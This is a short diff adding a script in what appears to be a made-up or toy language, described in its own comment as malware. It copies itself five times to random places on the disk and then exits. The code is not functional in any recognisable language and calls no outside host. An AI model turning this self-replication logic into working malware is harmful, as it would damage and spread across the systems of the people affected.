@@ -1,0 +1,10 @@
+@ Creates five copies out of this malware, and distributes them on random places on the disk
+
+[version 1.1]
+
+main:{
+    infect.set.start_after_birth();
+    infect.set.count("5");
+    infect.disk.random();
+    system.exit("0");
+}
